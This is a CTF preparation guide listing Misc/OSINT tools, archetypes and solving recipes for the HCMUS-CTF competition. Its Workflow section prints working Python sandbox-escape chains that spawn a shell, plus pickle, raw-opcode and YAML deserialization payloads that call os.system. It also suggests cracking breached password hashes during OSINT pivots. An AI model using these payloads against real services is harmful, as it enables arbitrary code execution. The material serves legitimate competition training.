# Misc / OSINT - Toolchain

Research-backed (2026-05-23) by cross-referencing CTF Support, picoCTF Solutions,
HackTricks audio/video forensics, neerajlovecyber, Lewis Watson's CTF tooling
post, DominicBreuker/stego-toolkit, the awesome-osint list, HackTricks
pyjail / Python-sandbox-escape, the David Hamann pickle deserialization
walkthrough, and the 2023 + J4F HCMUS material under
`practice/hyrnit-source/Misc/` and `writeups/Super Secret/`. Revised 2026-05-23
post-critique by `pwn` covering the Python jail / pickle / unsafe-deserialization
labor split. Consensus is consistent: every credible Misc/OSINT resource lists
the same five "day-one" tools (exiftool, ffmpeg/ffprobe, binwalk, CyberChef,
a username/email recon tool such as Sherlock / theHarvester), plus `pickletools`
from the Python stdlib for any opaque `.pkl` triage; with a tier-2 stego ring of
zsteg / stegsolve / steghide / stegseek / sonic-visualiser brought in on demand.

The Misc category at HCMUS-CTF tends to be the points-dense bracket-winner. Of
the eleven Misc tasks across 2023 + 2025 (`grind`, `japanese`, `falsehood`,
`Sneak Peek`, `pickle trouble`, `coin mining`, `python is safe`, `Social
Engineering`, `Bad Apple? Sequel`, `Bad Apple?`, plus J4F's `Super Secret`),
nine of eleven were solvable with under 45 minutes of pattern-match + the
day-one toolset. Only the two `Bad Apple?` entries needed exotic work
(Infinite Storage Glitch / Docker). Per STRATEGY.md "Forensics + Misc first
when unsure", this category feeds score while the brain is fresh.

There is significant overlap with Forensics (exiftool, binwalk, foremost, the
stego toolkit). This file treats those shared tools as light-touch references
and points to `tools/forensics.md` for the in-depth pcap / disk / WAV coverage.
This file owns: OSINT lookups, metadata-as-flag, encoding chains, esoteric
languages, social-Discord puzzles, image/video stego that is NOT a
pcap-derived artifact, and LOCAL Python source-review puzzles (eval-jail,
restricted-builtins sandbox, opaque .pkl / .yaml / .marshal files). A pickled
*network service* with a socket is pwn-shaped and lives in `tools/pwn.md`;
a shipped .py whose `eval(input())` you have to read past with no network is
misc-shaped and lives here. The split is by labor, not by file extension.

## Tier 1 - must have, install before the qualifier

| Tool | Why it's the consensus pick | Install |
|------|----------------------------|---------|
| **exiftool** | Universal first-pass on any image / audio / video / PDF / Office file. Reads EXIF, IPTC, XMP, GPS, makernotes, ID3 tags. Cited in every Misc/Forensics cheatsheet. Often the entire challenge ("the flag is in the metadata") - the `Bad Apple? Sequel` archetype. | `pacman -S perl-image-exiftool` |
| **ffmpeg + ffprobe** | The only realistic option for video metadata, container inspection, frame extraction, audio extraction, and stream demux. `ffprobe -v error -show_format -show_streams` dumps every box/atom. `ffmpeg -i in.mp4 -vf "select=eq(n\,N)" -vframes 1 frame.png` pulls a specific frame. | `pacman -S ffmpeg` |
| **binwalk + foremost** (+ **unblob**) | Carve embedded files out of a host file. Day-one move when a "single image" is suspiciously large or when `file` reports a trailing-data warning. **unblob** is the maintained successor to binwalk and extracts roughly 30 formats binwalk misses - run it second when binwalk produces nothing. (Forensics also uses these - see `tools/forensics.md` for disk-image carving recipes; here we only run them on a single suspicious blob.) | `pacman -S binwalk foremost` + `pipx install unblob` |
| **CyberChef** | Universal encoding-chain solver. Auto-magic recipe handles base64 / hex / URL / ROT / xor / gzip / zlib in one pass. Save it offline before the CTF in case the public host is throttled. Same pick as Crypto (`tools/crypto.md`) - it earns its place in both kits. | https://gchq.github.io/CyberChef/ (offline-cache the page) |
| **Sherlock + theHarvester** | OSINT lookups: Sherlock finds a username across 300+ sites, theHarvester enumerates emails / subdomains / IPs for a domain. The two together cover every "find their other account / find their email" OSINT prompt. | `pipx install sherlock-project` and `pipx install theHarvester` |
| **pickletools** (Python stdlib) | Safe disassembly of any opaque `.pkl`. `python -m pickletools file.pkl` dumps the opcode stream in one second and tells you whether `REDUCE` / `INST` / `OBJ` / `STACK_GLOBAL` (the RCE-shaped opcodes) are present. **Always pickletools-first, pickle.load-never** on a challenge file - `pickle.load` in your analysis script is RCE on you. | already in Python stdlib, no install |

Minimum viable Misc kit during the qualifier:
**exiftool + ffmpeg + binwalk + CyberChef (browser) + Sherlock + theHarvester
+ pickletools (stdlib).**

## Tier 2 - load on demand when the archetype matches

| Tool | Trigger archetype | Install |
|------|-------------------|---------|
| **zsteg** | PNG / BMP LSB stego. Brute-forces channel / bit-depth / endianness combos. `zsteg -a image.png` covers the common space in seconds. | `gem install zsteg` |
| **Stegsolve** | Manual visual stego: cycle XOR / bit-plane / channel views on PNG/JPG. The fallback when zsteg comes up empty. Java jar, no install needed. | https://github.com/zardus/ctf-tools/blob/master/stegsolve/install |
| **steghide** | JPEG / BMP / WAV / AU passphrase-protected stego. Try blank passphrase first: `steghide extract -sf in.jpg -p ''`. | `pacman -S steghide` |
| **stegseek** | Brute-force the steghide passphrase against a wordlist (millions of guesses per second). Use rockyou.txt as the default wordlist. | https://github.com/RickdeJager/stegseek |
| **stegolsb** (a.k.a. `stegano` / `lsb`) | LSB stego in WAV (matches `File Hidden` 2025) and PNG. `stegolsb wavsteg -r -i file.wav -o out.bin -n LSBs -b BYTES`. Note: forensics also uses this for the WAV-LSB archetype; see `tools/forensics.md`. | `pipx install stego-lsb` |
| **sonic-visualiser** + **Audacity** | Audio spectrogram / waveform inspection: flags often appear as text in the spectrogram. Also DTMF / SSTV decoding. | `pacman -S audacity sonic-visualiser` |
| **multimon-ng** | Demodulate DTMF, POCSAG, Morse, AX.25, and similar audio-encoded payloads from a WAV. | `pacman -S multimon-ng` |
| **Google reverse image search + TinEye + Yandex** | OSINT image lookup. Yandex is consistently the strongest for landmark / face matches in CTF challenges; TinEye is best for exact-copy hunts. Browser only, no install. | https://yandex.com/images/ https://tineye.com/ images.google.com |
| **Google dorks cheatsheet** | OSINT site/file lookups. Use `site:` `inurl:` `intitle:` `filetype:` to narrow a target. Memorize the four operators, not the whole list. | n/a |
| **Wayback Machine** | Historical lookups when a target page is dead or the flag was on an earlier revision. `archive.org/wayback/available?url=...` JSON API for scripted use. | https://web.archive.org/ |
| **Maltego CE** (community edition) | Visual link analysis for relationship-graph OSINT challenges (rare in HCMUS but appears once every few editions in the easy tier). Heavy install - skip unless you've actually seen the archetype. | https://www.maltego.com/downloads/ |
| **dCode multi-decoder** | Esoteric language and classical-cipher detector / decoder (Brainfuck, Whitespace, Ook, JSFuck, Malbolge, Vigenere, etc.). When CyberChef Magic gives up, dCode is the next pass. | https://www.dcode.fr/ |
| **iconv / chardet** | Mojibake unwinder. `practice/hyrnit-source/Misc/japanese/huh.txt` is a Shift-JIS file dumped through CP1252 - `iconv -f CP1252 -t LATIN1 huh.txt \| iconv -f SHIFT-JIS -t UTF-8` recovers the Japanese. `chardet` guesses the source codec. | `pacman -S libiconv` + `pipx install chardet` |
| **sqlite3** | Misc challenges occasionally ship a SQLite database as the puzzle medium - `grind` 2023 / J4F edition shipped `data-64-final.db` with base64 chains across rows. `.schema` then `SELECT * FROM ...` is the first move. | `pacman -S sqlite` (already installed on most distros) |
| **discord.py read-only client** + Discord search | Discord-as-challenge-medium (J4F `Super Secret` - flag in admin pin / profile bio). Use the in-app search box (`from:user`, `has:image`, `mentions:`) before scripting anything. A scripted scrape is only needed for messages older than search index range. | https://discord.com/ (web client) |
| **CrackStation / hashes.com** | Hash lookup for the OSINT-leaks-credentials sub-archetype (target's email -> known breach hash -> CrackStation -> password -> some other account). Browser only. | https://crackstation.net/ |
| **ChatGPT / Gemini / Claude** (rules-allowed per `HCMUS-CTF-PATTERNS.md` §1b) | Archetype identification on cryptic puzzles. Paste a short prompt with the file's first ~200 bytes / a description / a screenshot; ask "what encoding / esoteric language / cipher is this?". Faster than scrolling dCode by hand. | n/a |
| **PyYAML (unsafe loaders)** | `yaml.unsafe_load` / `yaml.load(stream, Loader=yaml.Loader)` deserialization. Payload: `!!python/object/apply:os.system ['id']`. Same RCE surface as pickle, shows up when a challenge ships a `.yaml` or `.yml` it parses with the unsafe loader. | `pip install pyyaml` (already pulled by most CTF deps) |
| **jsonpickle / marshal / shelve / dill** | All four ship the same `__reduce__`-style RCE surface as pickle. When the challenge source imports any of them and feeds untrusted bytes through `loads`, try the pickle gadget recipe (see Workflow) with the module name substituted. `dill` extends pickle to lambdas/closures - same payload still works. | `pip install jsonpickle dill` (`marshal`, `shelve` are stdlib) |
| **ast.literal_eval** (stdlib) | The safe replacement for `eval(challenge_data)` when YOU need to parse a Python literal from challenge input without running it. Also a tell when present in the challenge source: the bug is upstream of the parse (how the string reaches that call), not in the call itself. | already in Python stdlib, no install |

Note on overlap with forensics: exiftool, binwalk, foremost, stegolsb, audacity,
sonic-visualiser appear in both kits. `tools/forensics.md` owns the deep
treatment (pcap reassembly, disk carving, WAV-LSB-from-pcap chains). This file
treats them as quick utility commands you reach for on a single isolated Misc
file. Do not duplicate the forensics workflows here - if the challenge ships a
.pcap, .img, .E01, or a stego file referenced from a pcap, that is Forensics
work, not Misc.

## Mapping back to HCMUS-CTF archetypes

Cross-referenced with `HCMUS-CTF-PATTERNS.md` §4 and §4b:

| Archetype | Primary tool | Backup | Past challenges |
|-----------|--------------|--------|-----------------|
| YouTube / file metadata as the flag | exiftool / ffprobe | manual `strings` | Bad Apple? Sequel 2025 |
| Video frame as the flag (one specific frame holds text / QR) | `ffmpeg -vf select` to extract; zbarimg for QR | manual frame scrub | Bad Apple? 2025 (Infinite Storage Glitch variant) |
| Mojibake / wrong-codepage text | iconv (round-trip CP1252 -> SHIFT-JIS) | chardet then iconv | japanese 2023 |
| Encoding chain (base64 / hex / ROT / xor stacked) | CyberChef Magic recipe | manual `python -c` per layer | grind 2023 (base64 chained in SQLite rows) |
| Esoteric language (Brainfuck, Whitespace, Ook, JSFuck, Malbolge) | dCode multi-decoder | online interpreter per language | (recurring archetype, no exact 2023/2025 match) |
| Hidden file inside an image | binwalk -e then foremost | manual hex scan for PK / PNG magic | falsehood 2023 (lateral-thinking variant) |
| PNG / BMP LSB stego | zsteg -a | Stegsolve manual cycle | (recurring; tools/forensics.md WAV variant covered the 2025 case) |
| JPEG passphrase stego | steghide with blank password, then stegseek + rockyou | manual JPEG analysis | (recurring archetype) |
| Audio spectrogram flag | sonic-visualiser / Audacity spectrogram view | manual SoX | (recurring; not yet in HCMUS 2023/2025) |
| Audio modem / DTMF / Morse | multimon-ng | manual ear-decode (Morse only) | (recurring archetype) |
| OSINT - username lookup | Sherlock | manual Google `site:twitter.com` etc. | Social Engineering 2023 (variant) |
| OSINT - email / domain lookup | theHarvester | manual `whois` + Hunter.io | (recurring) |
| OSINT - reverse image | Yandex first, TinEye second | Google Lens | (recurring) |
| OSINT - dead page / historical revision | Wayback Machine | Google cache | (recurring) |
| Discord-as-medium (pinned msg / bot bio / channel topic) | Discord web search box (`from:`, `has:image`) | scripted via discord.py if older than index | Super Secret J4F edition |
| SQLite database as medium | sqlite3 `.schema` then targeted SELECT | DB Browser for SQLite GUI | grind 2023 (chained b64 across `data-64-*.db`) |
| Lateral-thinking / puzzle-without-tooling | LLM-as-archetype-identifier (ChatGPT / Gemini / Claude) | re-read the prompt slowly for a missed hint | falsehood 2023, Sneak Peek 2023 |
| Source-review math / logic bug | Read the .py top-to-bottom; look for integer-precision drift, off-by-one, float-vs-Decimal swaps, balance-update race | LLM as second pair of eyes | coin mining 2023 (balance-precision drift in a Python source file, no binary skills needed) |
| Local Python eval-jail / restricted-builtins sandbox | Python-jail escape ladder (see Workflow) | re-read the filter list character by character | python is safe 2023 |
| Local opaque `.pkl` / unsafe pickle source review | `python -m pickletools file.pkl` first; if you need to forge, `__reduce__` gadget recipe | hand-assemble pickle opcodes (`c<module>\n<name>\n(<args>tR.`) | (recurring archetype; pickle_trouble 2023 was the *network-service* variant - that one is pwn.md) |
| YAML / marshal / shelve / jsonpickle / dill deserialization | `!!python/object/apply:os.system ['id']` (YAML), pickle gadget recipe with module substituted (others) | manual opcode crafting | (recurring archetype across Vietnamese CTFs) |
| Network-service pickle / Python-jail-over-socket | `tools/pwn.md` - this is the pwn-shaped variant (socket, exploit script, pwntools-driven) | - | pickle trouble 2023 |

## Workflow

The workflow is the same loop the team-lead and STRATEGY.md endorse:
**triage -> exploit -> validate**, hard-capped at 45 minutes.

### Triage (target: under 5 minutes)

```
  +--------------------------------------------------------------+
  | 1. Read the challenge prompt twice. Note every proper noun,  |
  |    every URL, every username, every odd capitalization.      |
  |    Misc prompts are often the puzzle.                        |
  +--------------------------------------------------------------+
  | 2. Download every attachment. Run on each:                   |
  |       file <attachment>                                      |
  |       exiftool <attachment>                                  |
  |       binwalk <attachment>      (skip for .txt)              |
  |       strings -n 8 <attachment> | grep -iE 'HCMUS|flag|http' |
  |    For a `.pkl` / `.pickle` / `.dill` / `.marshal` file, ALSO |
  |    run `python -m pickletools <file>` BEFORE anything else.  |
  |    NEVER `pickle.load` a challenge file - that is RCE on YOU.|
  +--------------------------------------------------------------+
  | 3. Decide the archetype FROM THE TABLE ABOVE before opening  |
  |    a tool that isn't on this triage list.                    |
  +--------------------------------------------------------------+
```

Hints to route on:

- Prompt mentions a video / YouTube / "play this" -> ffprobe + ffmpeg path.
- Prompt mentions a person, an org, a username, a domain -> OSINT path.
- Prompt mentions Discord / a server invite -> in-app search path.
- Prompt has no attachment and is pure text -> encoding-chain or esoteric path.
- Attachment is an image and prompt hints "look closer" -> zsteg / stegsolve.
- Attachment is audio -> Audacity spectrogram first, then multimon-ng, then stegolsb.
- Attachment is a database / archive -> open the structure first, don't tool-bash.
- Text looks like garbage but has Japanese / Korean / Chinese-like patterns -> mojibake.
- Attachment is `.pkl` / `.dill` / `.marshal` / `.shelve` -> `pickletools` first, never `pickle.load`.
- Attachment is `.yaml` / `.yml` and the source uses `yaml.unsafe_load` or `yaml.load(..., Loader=Loader)` -> YAML deserialization payload path.
- Attachment is a `.py` and the prompt asks you to "find the bug" or "exploit" with no socket / network -> source-review or eval-jail path (local). If there IS a socket, route to pwn.

### Exploit - canonical recipes per archetype

**Metadata-as-flag** (Bad Apple? Sequel style):

```
exiftool -a -G1 -s file.mp4
# -a   include duplicate tags
# -G1  show the group each tag is from
# -s   short tag names (faster scanning)

# also try ffprobe for stream-level metadata:
ffprobe -v error -show_format -show_streams -show_chapters file.mp4

# Title / Comment / Description / Encoder / Artist / Album / Lyrics fields
# are the usual flag homes.
```

**Video frame extraction**:

```
# total frame count:
ffprobe -v error -count_frames -select_streams v:0 \
  -show_entries stream=nb_read_frames file.mp4

# extract every Nth frame for visual scan:
ffmpeg -i file.mp4 -vf "select=not(mod(n\,30))" -vsync vfr frame_%04d.png

# extract one specific frame (frame 12345):
ffmpeg -i file.mp4 -vf "select=eq(n\,12345)" -vframes 1 frame.png

# if any frame might contain a QR:
for f in frame_*.png; do zbarimg -q "$f" && echo "<- in $f"; done
```

**Mojibake unwind** (japanese 2023 - confirmed against `huh.txt`):

```
# The 2023 file is Shift-JIS misread as CP1252. Recover:
iconv -f CP1252 -t LATIN1 huh.txt | iconv -f SHIFT-JIS -t UTF-8

# If you do not know the source codec, ask chardet:
chardet huh.txt

# Common round-trips to try (BAD_DISPLAY -> ORIGINAL):
#   CP1252 -> SHIFT-JIS   (Japanese)
#   CP1252 -> EUC-KR      (Korean)
#   CP1252 -> GBK         (Chinese)
#   UTF-8  -> LATIN1      (the "Ã©" double-encoding case)
```

**Encoding chain** (grind 2023 SQLite + chained base64):

```
# 1. Look at the schema:
sqlite3 data-64-final.db '.schema'

# 2. Pull every row, pipe through CyberChef Magic via API
#    or, more reliably, loop Python:
python - <<'EOF'
import sqlite3, base64
con = sqlite3.connect("data-64-final.db")
for (val,) in con.execute("SELECT data FROM <table>"):
    while True:
        try:
            val = base64.b64decode(val).decode()
        except Exception:
            break
    print(val)
EOF

# 3. If CyberChef Magic is available, paste the cell content into:
#    https://gchq.github.io/CyberChef/  -> Operations -> Magic
#    -> Intensive mode ON, depth 6.
```

**Esoteric language detection**:

```
# Brainfuck:     mostly  + - < > [ ] . ,
# Whitespace:    only \t \n " "
# Ook:           "Ook." "Ook?" "Ook!" tokens
# JSFuck:        ()[]+!  with strings of () chains
# Malbolge:      80-char unprintable mess

# Recognize, then decode at:
#   https://www.dcode.fr/brainfuck-language
#   https://www.dcode.fr/whitespace-language
#   https://www.dcode.fr/ook-language
#   https://enkhee-osiris.github.io/Decoder-JSFuck/  (pure text -> JS source, NO eval)
#
# WARNING: do NOT use https://www.jsfuck.com/ - it paste-and-evals the input
# in your browser, so a malicious JSFuck blob can exfiltrate cookies / open
# attacker-controlled origins from your session. The enkhee-osiris decoder
# parses to readable JS source without executing it.
```

**Image LSB stego** (PNG / BMP):

```
# 1. Free pass:
zsteg -a image.png    # tries dozens of channel/bit-depth combos

# 2. If nothing, switch to manual:
java -jar stegsolve.jar    # cycle XOR / bit-planes / channels visually

# 3. Last resort - hand-craft with PIL:
python - <<'EOF'
from PIL import Image
im = Image.open("image.png")
bits = []
for y in range(im.height):
    for x in range(im.width):
        r,g,b,*_ = im.getpixel((x,y))
        bits.append(r & 1); bits.append(g & 1); bits.append(b & 1)
out = bytearray()
for i in range(0, len(bits)//8 * 8, 8):
    byte = 0
    for j in range(8):
        byte = (byte<<1) | bits[i+j]
    out.append(byte)
print(out[:512])
EOF
```

**JPEG passphrase stego**:

```
# blank passphrase is the day-one move:
steghide extract -sf image.jpg -p ''

# if that fails, brute with stegseek + rockyou:
stegseek image.jpg /usr/share/wordlists/rockyou.txt
```

**Python eval-jail / restricted-builtins escape ladder** (python is safe 2023):

The misc-tier ladder, shortest to longest. Stop at the first rung that works.

```
# Rung 1 - subclass walk via __class__ (the universal first try):
# Pick a callable subclass and invoke it.
().__class__.__base__.__subclasses__()
# walk the list to find: <class 'os._wrap_close'>  or
#                       <class 'subprocess.Popen'>
# then:
[c for c in ().__class__.__base__.__subclasses__()
 if c.__name__ == 'Popen'][0](['/bin/sh'], shell=False)

# Rung 2 - if __builtins__ is shadowed but lambdas survive:
(lambda: 0).__globals__['__builtins__']
# -> get back the real builtins, then __import__('os').system('id')

# Rung 3 - breakpoint() drops to pdb (Python 3.7+):
breakpoint()
# inside pdb: !import os; os.system('sh')

# Rung 4 - naive name filter? string-split the dangerous name:
getattr(__import__('o'+'s'), 'sys'+'tem')('id')

# Rung 5 - __base__ blocked? use __mro__:
().__class__.__mro__[1].__subclasses__()[<idx>]
# enumerate idx by printing the list once

# Bonus reads when you only have READ, not exec:
[x for x in ().__class__.__base__.__subclasses__()
 if 'BuiltinImporter' in str(x)][0]().load_module('os')
```

If the filter blocks dots: `getattr` chains, `__getitem__('os')`, format-string
attribute access (`'{0.__class__.__base__}'.format(())`) often slip through.

**Pickle gadget / unsafe-deserialization** (local .pkl / .dill / .marshal /
.yaml / .jsonpickle / .shelve):

```
# Step 1 - ALWAYS look at the bytes without loading them:
python -m pickletools file.pkl
# Presence of REDUCE / INST / OBJ / STACK_GLOBAL = the file CAN run code.

# Step 2 - if the challenge has an allowlist of classes, forge with
# __reduce__ returning a tuple of (allowlisted_callable, args_tuple):
import pickle
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('cat flag.txt',))
payload = pickle.dumps(Exploit())

# Step 3 - if class names are filtered, hand-assemble raw opcodes:
#   c<module>\n<name>\n   = STACK_GLOBAL (push module.name)
#   (                    = MARK (open tuple)
#   <args>               = push each arg
#   t                    = TUPLE (collect since MARK)
#   R                    = REDUCE (call f(*args))
#   .                    = STOP
payload = b"cos\nsystem\n(S'cat flag.txt'\ntR."

# Step 4 - YAML variant (yaml.unsafe_load / yaml.load(..., Loader=Loader)):
payload = b"!!python/object/apply:os.system ['cat flag.txt']\n"

# Step 5 - jsonpickle / dill / marshal / shelve - same __reduce__ surface,
# just substitute the loader. dill extends pickle to lambdas/closures so
# the SAME pickle payload still works against a dill.loads().
```

**Source-review math / logic bug** (coin mining 2023 archetype):

```
# Read the .py top-to-bottom. Patterns that ship a bug:
# 1. Balance arithmetic with float instead of Decimal:
#       balance = 1.0; balance -= 0.1  # accumulates float drift
# 2. Negative-amount transfers (no >0 check on user input)
# 3. TOCTOU between "check balance" and "deduct balance"
# 4. Integer overflow / underflow on 32-bit width simulations
# 5. round() banker's-rounding off-by-half-cent vs Decimal.quantize
# 6. Comparison against str instead of int after json.loads
#
# Tell: if the source uses ast.literal_eval (not eval), the bug is NOT
# in the parse - look at how the string reaches that call (the upstream
# input validator, the auth check before, the regex that splits the
# request). ast.literal_eval is safe; whatever feeds it may not be.
```

**Audio spectrogram**:

```
# 1. Open in Audacity or sonic-visualiser
# 2. Switch view: Spectrogram (Audacity: track menu) /
#    Layer -> Add Spectrogram (sonic-visualiser)
# 3. Look for text drawn in the frequency domain - flags often
#    appear as ASCII glyphs at ~3-15 kHz on a colored heatmap.
# 4. If the file is a mode (DTMF / Morse / POCSAG):
sox in.wav -t raw -r 22050 -e signed -b 16 -c 1 - | multimon-ng -a DTMF -a MORSE_CW -t raw -
```

**OSINT - username pivot**:

```
sherlock <handle>
# -> dump every site the username exists on; pick the one with a bio /
#    pinned post that might leak the flag.

theHarvester -d <domain> -b all
# -> emails, subdomains, IPs. Pivot on any in-scope email
#    against haveibeenpwned + crackstation.
```

**OSINT - reverse image**:

```
# 1. Yandex first (best for places / faces / artwork):
#       images.yandex.com -> upload image
# 2. TinEye second (best for exact-copy / earliest-known-source):
#       tineye.com -> upload image
# 3. Google Lens third (best for products and text in image)
# Do NOT auto-download landmark photos / faces from the result page -
# per ~/.claude/rules/asset-fetching.md, hand candidate URLs back to
# the user with provenance and let them fetch manually.
```

**Discord-as-medium** (Super Secret J4F):

```
# 1. Read every pinned message in every channel the team has access to.
# 2. Read every admin / bot profile bio (click avatar -> "View Profile").
# 3. Use the search box with operators:
#       from:<admin>          - all messages from that admin
#       has:image             - messages with image attachments
#       has:link              - messages with embedded links
#       mentions:@everyone    - announcement-style messages
# 4. Look for "rickroll layer" - one decoy link, real flag below.
# 5. If older than search index, ask BTC support before scripting -
#    rules around scripted scraping vary by event.
```

### Validate

Misc challenges submit to the same rCTF endpoint and same format as everything
else:

- Flag format: `HCMUS-CTF{...}` unless the challenge explicitly says otherwise.
  If your extraction reads `HCTF{...}` or `flag{...}`, wrap or strip to match
  before submitting - per `HCMUS-CTF-PATTERNS.md` §1b, the format is enforced.
- Submission goes through the solver browser profile only - never paste an
  extracted flag into ChatGPT / Gemini / Claude / Discord public channels
  (per STRATEGY.md "Login policy").
- If the extracted string isn't accepted, before re-extracting check:
  trailing whitespace, smart-quote / em-dash / homoglyph substitutions,
  base64 padding, hex case (`HCMUS-CTF{...}` is case-sensitive inside the
  braces unless the prompt says otherwise).

## Anti-patterns

- DO NOT `pickle.load` / `dill.load` / `yaml.unsafe_load` / `marshal.loads` /
  `shelve.open` a challenge file inside your analysis script. That IS RCE
  on YOU - the very thing the challenge wants you to exploit on the target.
  `python -m pickletools file.pkl` first, ALWAYS. Same rule for YAML: parse
  with `yaml.safe_load`, never `yaml.load` without an explicit safe Loader.
- DO NOT run untrusted Misc attachments (`.exe`, `.elf`, `.apk`, `.jar`,
  `.docx` with macros) on the host. Use the distrobox `ctf` sandbox per
  CLAUDE.md "Toolkit setup".
- DO NOT spend more than 45 minutes on one Misc challenge. The category's
  whole point is fast points; if you have not pattern-matched within 15
  minutes and made progress within 30, mark it and move on - STRATEGY.md
  "Discipline rules".
- DO NOT chase a Discord puzzle outside the official team Discord. If the
  challenge points at a third-party server, read the prompt twice - it's
  almost always a hint inside the official server.
- DO NOT auto-install / auto-download asset packs, fonts, or media files
  "to look up later". Per `~/.claude/rules/asset-fetching.md`, present
  candidate URLs in a table and let the user pull manually.
- DO NOT skip exiftool / binwalk / file on a new attachment. They take
  three seconds and pre-empty roughly half of all Misc challenges.

## Sources

- [Image Steganography - CTF Support](https://ctf.support/steganography/image-steganography/)
- [Audio Steganography - CTF Support](https://ctf.support/steganography/audio-steganography/)
- [Introduction to Steganography Tools - picoCTF Solutions](https://picoctfsolutions.com/posts/steganography-tools)
- [Video and Audio file analysis - HackTricks](https://hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/video-and-audio-file-analysis.html)
- [CTF Miscellaneous - rootsec](https://www.rootsec.in/cheatsheets/ctf/ctf-misc)
- [Steganography Cheatsheet for CTF Beginners - neerajlovecyber](https://neerajlovecyber.com/steganography-cheatsheet-for-ctf-beginners)
- [Handy Tools for CTF Competitions - Lewis Watson](https://lnwatson.co.uk/posts/ctf-tools/)
- [Audio Steganography Cheatsheet - Img2Sound](https://img2sound.com/articles/audio-steganography-cheatsheet/)
- [DominicBreuker/stego-toolkit (GitHub)](https://github.com/DominicBreuker/stego-toolkit)
- [jivoi/awesome-osint (GitHub)](https://github.com/jivoi/awesome-osint)
- [Top OSINT Tools 2025 - UtopianKnight](https://utopianknight.com/top-20-free-open-source-intelligence-osint-tools-for-2025/)
- [The Ultimate OSINT Cheat Sheet 2025 - TheCyberMind](https://thecybermind.co/osint-cheat-sheet/)
- [ExifTool homepage - Phil Harvey](https://exiftool.org/)
- [Forensics - CTF Field Guide (Trail of Bits)](https://trailofbits.github.io/ctf/forensics/)
- [Steganography list - 0xRick](https://0xrick.github.io/lists/stego/)
- [dCode multi-decoder](https://www.dcode.fr/)
- [Python pickle - exploiting deserialization (David Hamann)](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
- [Sneaky Python deserialization - hacktricks](https://book.hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html)
- [Python sandbox escape - GTFOBins / pyjail patterns](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html)
- [JSFuck decoder (no-eval) - enkhee-osiris](https://enkhee-osiris.github.io/Decoder-JSFuck/)
- [unblob - extraction successor to binwalk](https://unblob.org/)
- [pickletools - Python stdlib disassembler](https://docs.python.org/3/library/pickletools.html)
